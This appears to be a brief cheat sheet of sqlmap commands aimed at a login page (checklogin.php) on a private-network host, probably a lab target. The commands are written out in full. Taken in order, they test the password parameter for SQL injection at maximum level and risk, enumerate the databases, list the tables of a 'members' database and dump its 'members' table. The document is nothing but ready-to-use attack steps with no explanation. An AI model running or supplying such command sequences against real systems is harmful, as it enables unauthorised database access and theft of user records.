# SqlMap

`sqlmap -u "http://192.168.1.32/checklogin.php" --data "myusername=admin&mypassword=nmdb" -p mypassword --dbms=MySQL --level=5 --risk=3`

`sqlmap -u "http://192.168.1.32/checklogin.php" --data "myusername=admin&mypassword=nmdb" -p mypassword --dbs`

`sqlmap -u "http://192.168.1.32/checklogin.php" --data "myusername=admin&mypassword=nmdb" -p mypassword --dbms=MySQL --level=5 --risk=3 -D members --tables`

`sqlmap -u "http://192.168.1.32/checklogin.php" --data "myusername=admin&mypassword=nmdb" -p mypassword --dbms=MySQL --level=5 --risk=3 -D members -T members --dump`
